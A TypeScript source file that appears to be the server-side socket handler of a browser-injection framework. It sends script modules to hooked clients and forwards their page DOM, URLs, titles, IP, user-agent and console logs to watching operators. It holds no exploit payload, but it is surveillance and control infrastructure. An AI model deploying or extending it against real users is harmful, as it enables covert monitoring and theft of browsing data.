declare var global: any
import chalk from 'chalk'
import Logger from '../logger'
import * as _ from 'lodash'
import * as perfy from 'perfy'
const uuidv4 = require('uuid/v4')
const minify = require('html-minifier').minify

import { SocketSession } from './definitions/session'
import { Module } from './definitions/module'
import { Record } from './definitions/record'
import ModuleEval from './ModuleEval'
import DataRecorder from './DataRecorder'

export default class {
  socket: any
  session: SocketSession.session
  send: any
  token: string
  project: SocketSession.project
  client: any
  heartbeat = null

  constructor(that: any) {
    this.pulse()
    this.socket = that.socket
    this.session = that.session
    this.send = that.send
    this.token = that.token
    this.project = that.session.project
    this.client = that.client
  }

  on = {
    /**
     * Module loader
     */
    module: (data) => {
      const timing = Symbol('timing')
      perfy.start(timing)
      try {
        if (!data.name) return
        const CachedModule: Module.Cache | null = _.find(
          global.inject.modules,
          { name: [data.name] }
        )
        if (CachedModule) {
          let js = this.session.debug
            ? CachedModule.debug_bundle
            : CachedModule.production_bundle
          try {
            if (CachedModule.config.server_side) {
              try {
                js = ModuleEval(js, {
                  Module: {
                    name: data.name,
                    token: data.token,
                    params: data.params
                  },
                  injectify: {
                    info: {
                      ...this.client.session,
                      project: this.session.project.name,
                      'user-agent': this.client.client['user-agent'],
                      ip: this.client.client.ip
                    },
                    devtools: {
                      ...this.client.session.devtools
                    },
                    debug: this.client.session.debug
                  }
                })
              } catch (e) {
                this.send('module', {
                  name: data.name,
                  token: data.token,
                  time: this.session.debug
                    ? perfy.end(timing).milliseconds
                    : undefined,
                  error: {
                    code: 'module-error',
                    message: `Encountered an error whilst running server-side code for module "${
                      data.name
                    }"${this.session.debug ? `\n\n${e.stack}` : ''}`
                  }
                })
                Logger(
                  ['client', 'module'],
                  'error',
                  `Exception in server-side code for module "${data.name}"${
                    this.session.debug ? `\n\n${e.stack}` : ''
                  }`
                )
                return
              }
            }
            const time = perfy.end(timing).milliseconds
            this.send('module', {
              name: data.name,
              token: data.token,
              time: this.session.debug ? time : undefined,
              script: js
            })
            Logger(['client', 'module'], 'log', {
              ip: this.client.client.ip.query,
              module: data.name,
              time
            })
          } catch (error) {
            this.send('module', {
              name: data.name,
              token: data.token,
              time: this.session.debug
                ? perfy.end(timing).milliseconds
                : undefined,
              error: {
                code: 'server-error',
                message: `Encountered a server-side error whilst loading module "${
                  data.name
                }"`
              }
            })
            Logger(
              ['client', 'module'],
              'error',
              `Failed to load module ${data.name}\n\n${error.stack}`
            )
          }
        } else {
          this.send('module', {
            name: data.name,
            token: data.token,
            time: this.session.debug
              ? perfy.end(timing).milliseconds
              : undefined,
            error: {
              code: 'not-installed',
              message: `Module "${data.name}" not installed on server`
            }
          })
          Logger(['client', 'module'], 'warn', {
            module: data.name
          })
        }
      } catch (error) {
        Logger(['client', 'module'], 'error', error)
      }
    },

    /**
     * PageGhost
     */
    p: (data) => {
      if (data && data instanceof Object) {
        if (
          global.inject.clients[this.project.id][this.token] &&
          global.inject.clients[this.project.id][this.token].watchers
        ) {
          if (data.dom && global.config.compression) {
            try {
              let minfied = minify(data.dom, {
                removeAttributeQuotes: true,
                collapseBooleanAttributes: true,
                collapseWhitespace: true,
                decodeEntities: true,
                html5: true,
                minifyCSS: true,
                minifyJS: true,
                removeEmptyAttributes: true,
                removeOptionalTags: true,
                removeRedundantAttributes: true,
                removeScriptTypeAttributes: true,
                removeStyleLinkTypeAttributes: true,
                removeTagWhitespace: true,
                trimCustomFragments: true,
                useShortDoctype: true
              })
              data.dom = minfied
            } catch (e) {}
          }
          global.inject.clients[this.project.id][this.token].watchers.forEach(
            (watcher) => {
              watcher.emit('inject:pageghost', {
                timestamp: +new Date(),
                id: uuidv4(),
                sender: this.client.session,
                data: data
              })
            }
          )
        }
      }
    },

    /**
     * Client info logger
     */
    i: (data) => {
      /**
       * Max string length
       */
      let maxStringLength = 100
      let maxUrlLength = 2083
      /**
       * Safely parse data
       */
      if (typeof data === 'object') {
        if (typeof data.window === 'object') {
          let { title, url, active } = data.window
          if (typeof title === 'string') {
            this.client.session.window.title = title.substring(
              0,
              maxStringLength
            )
          }
          if (typeof url === 'string') {
            this.client.session.window.url = url.substring(0, maxUrlLength)
            this.client.session.window.favicon = `https://plus.google.com/_/favicon?domain_url=${encodeURIComponent(
              this.client.session.window.url
            )}`
          }
          if (typeof active === 'boolean') {
            this.client.session.window.active = active
          }
        }
        if (typeof data.devtools === 'object') {
          let { open, orientation } = data.devtools
          if (
            orientation === 'vertical' ||
            orientation === null ||
            orientation === 'horizontal'
          ) {
            this.client.session.devtools.orientation = orientation
          }
          if (typeof open === 'boolean') {
            this.client.session.devtools.open = open
          }
        }
      }
      /**
       * Emit to listening watchers
       */
      if (
        global.inject.clients[this.project.id][this.token] &&
        global.inject.clients[this.project.id][this.token].watchers
      ) {
        global.inject.clients[this.project.id][this.token].watchers.forEach(
          (watcher) => {
            watcher.emit(
              'inject:client',
              global.inject.clients[this.project.id][this.token]
            )
          }
        )
      }
    },

    /**
     * Data logger
     */
    l: (data) => {
      if (
        data &&
        data.message instanceof Array &&
        /^warn|info|error|table|return$/.test(data.type)
      ) {
        if (
          global.inject.clients[this.project.id][this.token] &&
          global.inject.clients[this.project.id][this.token].watchers
        ) {
          global.inject.clients[this.project.id][this.token].watchers.forEach(
            (watcher) => {
              watcher.emit('inject:log', {
                type: data.type,
                message: data.message,
                timestamp: +new Date(),
                id: uuidv4(),
                sender: this.client.session
              })
            }
          )
        }
      }
    },

    /**
     * Data recorder
     */
    r: (request: Record.ClientRequest) => {
      const { table, mode, data, id } = request
      if (
        typeof table === 'string' &&
        typeof data !== 'undefined' &&
        typeof mode === 'string' &&
        /^insert|update|append$/.test(mode)
      ) {
        DataRecorder(mode, {
          socket: this.client,
          table,
          project: this.session.project.name,
          data
        })
          .then((result) => {
            if (result.nModified) {
              Logger(['client', 'record'], 'log', {
                mode,
                project: this.session.project.name,
                table
              })
            }
          })
          .catch((error) => {
            Logger(['client', 'record'], 'error', error)
          })
      }
    },

    /**
     * Error logger
     */
    e: (data) => {
      this.send('error', data)
      if (
        global.inject.clients[this.project.id][this.token] &&
        global.inject.clients[this.project.id][this.token].watchers
      ) {
        global.inject.clients[this.project.id][this.token].watchers.forEach(
          (watcher) => {
            watcher.emit('inject:log', {
              type: 'error',
              message: [
                {
                  type: 'string',
                  message: data
                }
              ]
            })
          }
        )
      }
    },

    /**
     * Get server ping time
     */
    ping: (pingTime) => {
      this.send('pong', pingTime)
    },

    /**
     * Client heartbeat
     */
    heartbeat: (data) => {
      // Acknowledge heartbeat
      //this.send('stay-alive')

      this.pulse()
    }
  }

  pulse = (seconds: number = 16) => {
    clearTimeout(this.heartbeat)
    this.heartbeat = setTimeout(() => this.heartAttack(), seconds * 1000)
  }

  heartAttack = () => {
    /**
     * Client has stopped sending heartbeats :O
     * Attempt to give them CPR
     */
    this.send('cpr')
    clearTimeout(this.heartbeat)

    this.heartbeat = setTimeout(() => {
      /**
       * Client refused CPR attempt
       */
      this.socket.close()
    }, 2 * 1000)
  }
}
